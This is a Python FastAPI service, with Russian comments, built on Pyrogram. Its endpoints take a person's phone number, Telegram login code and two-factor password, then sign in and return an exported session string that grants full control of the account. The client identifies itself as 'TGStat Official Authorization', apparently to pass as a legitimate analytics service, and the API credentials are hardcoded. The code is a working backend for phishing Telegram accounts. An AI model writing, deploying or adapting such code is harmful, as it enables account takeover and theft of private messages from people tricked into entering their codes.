import os
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded

app = FastAPI()

API_ID = 23890911
API_HASH = "515136b5f0891d3af2d7dc74a8571a71"

# Глобальное хранилище клиентов (на продакшене лучше заменить на БД или другое решение)
phone_client_map = {}

class SendCodeRequest(BaseModel):
    phone_number: str

class VerifyCodeRequest(BaseModel):
    phone_number: str
    phone_code: str
    password: str | None = None

@app.post("/send_code")
async def send_code(req: SendCodeRequest):
    phone_number = req.phone_number

    # Инициализируем Pyrogram-клиент с нужными параметрами для отображения
    client = Client(
        session_name=f"{phone_number}_session",
        api_id=API_ID,
        api_hash=API_HASH,
        device_model="TGStat Official Authorization",
        system_version="1.0",
        app_version="tgstat.su 3.7.0",
        lang_code="en"
    )

    await client.connect()

    try:
        await client.send_code(phone_number)
    except Exception as e:
        await client.disconnect()
        raise HTTPException(status_code=400, detail=str(e))

    phone_client_map[phone_number] = client
    return {"status": "OK", "detail": "Code sent to your phone"}

@app.post("/verify_code")
async def verify_code(req: VerifyCodeRequest):
    phone_number = req.phone_number
    phone_code = req.phone_code
    password = req.password

    client = phone_client_map.get(phone_number)
    if not client:
        raise HTTPException(status_code=404, detail="Client session not found. Send code first.")

    try:
        await client.sign_in(phone_number=phone_number, phone_code=phone_code)
    except SessionPasswordNeeded:
        if not password:
            raise HTTPException(status_code=401, detail="2FA password required")
        try:
            await client.check_password(password)
        except Exception as e:
            raise HTTPException(status_code=401, detail=f"Invalid 2FA password: {e}")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

    # Если авторизация успешна, получаем session_string
    session_string = await client.export_session_string()
    return {"status": "OK", "session_string": session_string}

